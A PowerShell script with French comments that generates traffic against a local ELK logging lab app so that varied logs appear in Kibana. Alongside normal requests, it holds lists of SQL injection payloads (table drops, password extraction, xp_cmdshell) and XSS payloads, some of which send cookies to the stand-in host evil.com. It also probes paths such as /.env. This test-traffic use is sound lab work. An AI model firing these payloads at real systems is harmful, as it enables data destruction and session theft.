# =============================================================================
# Generate-Traffic.ps1
# Simule un afflux massif de trafic HTTP vers l'application ELK Logging Lab
# pour generer des logs varies dans Elasticsearch / Kibana.
#
# Usage : .\generate-traffic.ps1 [-BaseUrl http://localhost:8080] [-Rounds 5]
# =============================================================================
param(
    [string]$BaseUrl = "http://localhost:8080",
    [int]$Rounds = 5
)

$totalRequests = 0
$totalErrors = 0
$sw = [System.Diagnostics.Stopwatch]::StartNew()

function Send-Request {
    param(
        [string]$Method = "GET",
        [string]$Uri,
        [string]$Body,
        [string]$Label,
        [switch]$ExpectError
    )

    $script:totalRequests++
    $color = if ($ExpectError) { "DarkYellow" } else { "Gray" }

    try {
        $params = @{
            Uri         = $Uri
            Method      = $Method
            ErrorAction = "Stop"
        }
        if ($Body) {
            $params.Body = $Body
            $params.ContentType = "application/json"
        }

        $resp = Invoke-RestMethod @params
        Write-Host "  [OK]    $Label" -ForegroundColor Green
    } catch {
        $status = $_.Exception.Response.StatusCode.value__
        if ($ExpectError) {
            Write-Host "  [${status}]   $Label (attendu)" -ForegroundColor $color
        } else {
            Write-Host "  [ERR]   $Label - $($_.Exception.Message)" -ForegroundColor Red
            $script:totalErrors++
        }
    }
}

function Write-Phase {
    param([string]$Title, [string]$Icon)
    Write-Host ""
    Write-Host "--- $Icon $Title ---" -ForegroundColor Cyan
}

# ===========================================================================
# Verification que l'app est accessible
# ===========================================================================
Write-Host "=============================================" -ForegroundColor White
Write-Host "  Generateur de trafic - ELK Logging Lab" -ForegroundColor White
Write-Host "  Cible : $BaseUrl" -ForegroundColor White
Write-Host "  Rounds : $Rounds" -ForegroundColor White
Write-Host "=============================================" -ForegroundColor White

Write-Host "`nVerification de l'application..." -ForegroundColor Yellow
try {
    Invoke-RestMethod -Uri "$BaseUrl/api/diagnostics/health" -Method Get -ErrorAction Stop | Out-Null
    Write-Host "Application accessible !" -ForegroundColor Green
} catch {
    Write-Host "ERREUR : L'application n'est pas accessible sur $BaseUrl" -ForegroundColor Red
    Write-Host "Assurez-vous que la stack Docker est demarree (docker compose up)" -ForegroundColor Yellow
    exit 1
}

# ===========================================================================
# Boucle principale
# ===========================================================================
for ($round = 1; $round -le $Rounds; $round++) {
    Write-Host ""
    Write-Host "================================================" -ForegroundColor White
    Write-Host "  ROUND $round / $Rounds" -ForegroundColor White
    Write-Host "================================================" -ForegroundColor White

    # -----------------------------------------------------------------------
    # Phase 1 : Trafic normal - CRUD produits
    # -----------------------------------------------------------------------
    Write-Phase "Trafic normal - Lecture produits" "1/8"

    Send-Request -Uri "$BaseUrl/api/products" -Label "GET /api/products (liste)"
    Send-Request -Uri "$BaseUrl/api/products/1" -Label "GET /api/products/1"
    Send-Request -Uri "$BaseUrl/api/products/2" -Label "GET /api/products/2"
    Send-Request -Uri "$BaseUrl/api/products/3" -Label "GET /api/products/3"
    Send-Request -Uri "$BaseUrl/api/products/search?name=test" -Label "GET /api/products/search?name=test"
    Send-Request -Uri "$BaseUrl/api/products/search?category=Electronics" -Label "GET /api/products/search?category=Electronics"
    Send-Request -Uri "$BaseUrl/api/products/search?minPrice=10&maxPrice=100" -Label "GET /api/products/search?minPrice=10&maxPrice=100"
    Send-Request -Uri "$BaseUrl/api/products/999" -Label "GET /api/products/999 (404)" -ExpectError

    # Creation, modification, suppression
    Write-Phase "Trafic normal - CRUD produits" "2/8"

    $newProduct = @{
        name        = "Product-Round$round-$(Get-Random -Maximum 9999)"
        description = "Produit genere automatiquement round $round"
        price       = [math]::Round((Get-Random -Minimum 5 -Maximum 500) + (Get-Random -Maximum 100) / 100, 2)
        category    = @("Electronics", "Books", "Clothing", "Food", "Tools") | Get-Random
    } | ConvertTo-Json

    Send-Request -Method POST -Uri "$BaseUrl/api/products" -Body $newProduct -Label "POST /api/products (creation)"

    $updateProduct = @{
        name        = "Updated-Round$round"
        description = "Produit mis a jour"
        price       = 42.99
        category    = "Updated"
    } | ConvertTo-Json

    Send-Request -Method PUT -Uri "$BaseUrl/api/products/1" -Body $updateProduct -Label "PUT /api/products/1 (mise a jour)"

    # -----------------------------------------------------------------------
    # Phase 2 : Trafic normal - Commandes
    # -----------------------------------------------------------------------
    Write-Phase "Trafic normal - Commandes" "3/8"

    Send-Request -Uri "$BaseUrl/api/orders" -Label "GET /api/orders (liste)"
    Send-Request -Uri "$BaseUrl/api/orders/1" -Label "GET /api/orders/1"
    Send-Request -Uri "$BaseUrl/api/orders/999" -Label "GET /api/orders/999 (404)" -ExpectError

    $newOrder = @{
        productId     = Get-Random -Minimum 1 -Maximum 5
        quantity      = Get-Random -Minimum 1 -Maximum 20
        customerEmail = "test.round${round}@lab.local"
    } | ConvertTo-Json

    Send-Request -Method POST -Uri "$BaseUrl/api/orders" -Body $newOrder -Label "POST /api/orders (nouvelle commande)"

    $statusUpdate = @{ status = @("Processing", "Shipped", "Delivered") | Get-Random } | ConvertTo-Json
    Send-Request -Method PATCH -Uri "$BaseUrl/api/orders/1/status" -Body $statusUpdate -Label "PATCH /api/orders/1/status"

    # -----------------------------------------------------------------------
    # Phase 3 : Audit et diagnostics
    # -----------------------------------------------------------------------
    Write-Phase "Audit et diagnostics" "4/8"

    Send-Request -Uri "$BaseUrl/api/audit" -Label "GET /api/audit (logs recents)"
    Send-Request -Uri "$BaseUrl/api/audit?count=10" -Label "GET /api/audit?count=10"
    Send-Request -Uri "$BaseUrl/api/audit/search?action=CREATE" -Label "GET /api/audit/search?action=CREATE"
    Send-Request -Uri "$BaseUrl/api/audit/search?entityType=Product" -Label "GET /api/audit/search?entityType=Product"
    Send-Request -Uri "$BaseUrl/api/diagnostics/health" -Label "GET /api/diagnostics/health"

    # -----------------------------------------------------------------------
    # Phase 4 : Requetes lentes (slow queries)
    # -----------------------------------------------------------------------
    Write-Phase "Requetes lentes (slow queries)" "5/8"

    Send-Request -Uri "$BaseUrl/api/diagnostics/slow-query" -Label "GET /api/diagnostics/slow-query (800-2000ms)"
    Send-Request -Uri "$BaseUrl/api/products/slow" -Label "GET /api/products/slow (requete lente deliberee)"
    Send-Request -Uri "$BaseUrl/api/diagnostics/slow-query" -Label "GET /api/diagnostics/slow-query (2e appel)"

    # -----------------------------------------------------------------------
    # Phase 5 : Erreurs et exceptions
    # -----------------------------------------------------------------------
    Write-Phase "Erreurs et exceptions" "6/8"

    Send-Request -Uri "$BaseUrl/api/diagnostics/exception" -Label "GET /api/diagnostics/exception (500)" -ExpectError
    Send-Request -Uri "$BaseUrl/api/diagnostics/exception" -Label "GET /api/diagnostics/exception (500 bis)" -ExpectError
    Send-Request -Uri "$BaseUrl/api/diagnostics/memory-pressure" -Label "GET /api/diagnostics/memory-pressure"
    Send-Request -Uri "$BaseUrl/api/diagnostics/log-burst?count=50" -Label "GET /api/diagnostics/log-burst?count=50"
    Send-Request -Uri "$BaseUrl/api/diagnostics/log-burst?count=100" -Label "GET /api/diagnostics/log-burst?count=100"

    # Routes inexistantes (404)
    Send-Request -Uri "$BaseUrl/api/nonexistent" -Label "GET /api/nonexistent (404)" -ExpectError
    Send-Request -Uri "$BaseUrl/admin/secret" -Label "GET /admin/secret (404)" -ExpectError
    Send-Request -Uri "$BaseUrl/.env" -Label "GET /.env (tentative acces fichier)" -ExpectError
    Send-Request -Uri "$BaseUrl/wp-admin" -Label "GET /wp-admin (scan WordPress)" -ExpectError
    Send-Request -Uri "$BaseUrl/phpmyadmin" -Label "GET /phpmyadmin (scan phpMyAdmin)" -ExpectError

    # -----------------------------------------------------------------------
    # Phase 6 : Attaques SQL Injection
    # -----------------------------------------------------------------------
    Write-Phase "Attaques SQL Injection" "7/8"

    $sqliPayloads = @(
        "SELECT * FROM users",
        "1 OR 1=1",
        "1; DROP TABLE products--",
        "' UNION SELECT username, password FROM users--",
        "admin'--",
        "1 AND 1=1",
        "'; INSERT INTO users VALUES('hacker','hacked')--",
        "1; EXEC xp_cmdshell('whoami')--",
        "' OR ''='",
        "1; UPDATE products SET price=0--",
        "'; DELETE FROM orders WHERE 1=1--",
        "UNION ALL SELECT NULL,NULL,table_name FROM information_schema.tables--",
        "1 OR EXISTS(SELECT * FROM users WHERE username='admin')",
        "'; ALTER TABLE products ADD COLUMN backdoor TEXT--",
        "' OR 1=1; CREATE USER hacker IDENTIFIED BY 'pass123'--"
    )

    foreach ($payload in $sqliPayloads) {
        $encoded = [System.Uri]::EscapeDataString($payload)
        Send-Request -Uri "$BaseUrl/api/products/search?name=$encoded" `
            -Label "SQLi: $($payload.Substring(0, [Math]::Min(50, $payload.Length)))" -ExpectError
    }

    # SQLi dans d'autres parametres
    Send-Request -Uri "$BaseUrl/api/products/search?category=$([System.Uri]::EscapeDataString("' OR 1=1--"))" `
        -Label "SQLi dans category" -ExpectError
    Send-Request -Uri "$BaseUrl/api/audit/search?action=$([System.Uri]::EscapeDataString("'; DROP TABLE audit_logs--"))" `
        -Label "SQLi dans audit search" -ExpectError

    # -----------------------------------------------------------------------
    # Phase 7 : Attaques XSS
    # -----------------------------------------------------------------------
    Write-Phase "Attaques XSS" "8/8"

    $xssPayloads = @(
        "<script>alert('XSS')</script>",
        "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<iframe src='javascript:alert(1)'>",
        "javascript:alert(document.cookie)",
        "<body onload=alert('XSS')>",
        "<img src=x onerror=fetch('http://evil.com/'+document.cookie)>",
        "<div onmouseover=alert('XSS')>hover me</div>",
        "<input onfocus=alert('XSS') autofocus>",
        "<marquee onstart=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        "<a href='javascript:alert(1)'>click</a>",
        "<math><mtext><table><mglyph><svg><mtext><textarea><path id=x d='M0'><svg onload=alert(1)>",
        "<script>new Image().src='http://evil.com/log?cookie='+document.cookie</script>"
    )

    foreach ($payload in $xssPayloads) {
        $encoded = [System.Uri]::EscapeDataString($payload)
        Send-Request -Uri "$BaseUrl/api/products/search?name=$encoded" `
            -Label "XSS: $($payload.Substring(0, [Math]::Min(50, $payload.Length)))" -ExpectError
    }

    # XSS dans les corps de requete (POST)
    $xssProduct = @{
        name        = "<script>alert('XSS')</script>"
        description = "<img src=x onerror=alert('stored-xss')>"
        price       = 0
        category    = "<svg onload=alert(1)>"
    } | ConvertTo-Json

    Send-Request -Method POST -Uri "$BaseUrl/api/products" -Body $xssProduct -Label "XSS dans body POST produit"

    $xssOrder = @{
        productId     = 1
        quantity      = 1
        customerEmail = "<script>alert('xss')</script>@evil.com"
    } | ConvertTo-Json

    Send-Request -Method POST -Uri "$BaseUrl/api/orders" -Body $xssOrder -Label "XSS dans body POST commande"

    # -----------------------------------------------------------------------
    # Rafale rapide (rate limiting)
    # -----------------------------------------------------------------------
    if ($round -eq $Rounds) {
        Write-Host ""
        Write-Host "--- BONUS : Rafale rapide (declenchement rate limit) ---" -ForegroundColor Magenta

        Write-Host "  Envoi de 60 requetes rapides..." -ForegroundColor Yellow
        for ($i = 1; $i -le 60; $i++) {
            try {
                Invoke-RestMethod -Uri "$BaseUrl/api/products" -Method Get -ErrorAction Stop | Out-Null
            } catch { }
            $script:totalRequests++
            if ($i % 10 -eq 0) {
                Write-Host "    $i / 60 requetes envoyees" -ForegroundColor DarkGray
            }
        }
        Write-Host "  Rafale terminee (rate limit devrait etre detecte dans les logs)" -ForegroundColor Green
    }

    # Pause entre les rounds
    if ($round -lt $Rounds) {
        $pause = Get-Random -Minimum 2 -Maximum 5
        Write-Host ""
        Write-Host "  Pause de ${pause}s avant le prochain round..." -ForegroundColor DarkGray
        Start-Sleep -Seconds $pause
    }
}

# ===========================================================================
# Resume
# ===========================================================================
$sw.Stop()

Write-Host ""
Write-Host "================================================" -ForegroundColor Green
Write-Host "  Generation de trafic terminee !" -ForegroundColor Green
Write-Host "================================================" -ForegroundColor Green
Write-Host ""
Write-Host "  Requetes totales  : $totalRequests" -ForegroundColor White
Write-Host "  Erreurs inattend. : $totalErrors" -ForegroundColor $(if ($totalErrors -gt 0) { "Red" } else { "Green" })
Write-Host "  Duree totale      : $([math]::Round($sw.Elapsed.TotalSeconds, 1))s" -ForegroundColor White
Write-Host ""
Write-Host "  Types de logs generes :" -ForegroundColor Yellow
Write-Host "    - Requetes HTTP normales (GET, POST, PUT, PATCH, DELETE)" -ForegroundColor Gray
Write-Host "    - Erreurs 404 (routes inexistantes, scans)" -ForegroundColor Gray
Write-Host "    - Erreurs 500 (exceptions deliberees)" -ForegroundColor Gray
Write-Host "    - Requetes lentes (slow queries EF Core + HTTP)" -ForegroundColor Gray
Write-Host "    - Rafales de logs (log-burst 50 + 100 messages)" -ForegroundColor Gray
Write-Host "    - Tentatives SQL Injection ($($sqliPayloads.Count) payloads)" -ForegroundColor Gray
Write-Host "    - Tentatives XSS ($($xssPayloads.Count) payloads + body)" -ForegroundColor Gray
Write-Host "    - Rate limiting (rafale de 60 requetes)" -ForegroundColor Gray
Write-Host ""
Write-Host "  Ouvrir Kibana pour voir les resultats :" -ForegroundColor Yellow
Write-Host "    http://localhost:5601/app/dashboards#/view/elklab-main-dashboard" -ForegroundColor Yellow
Write-Host ""
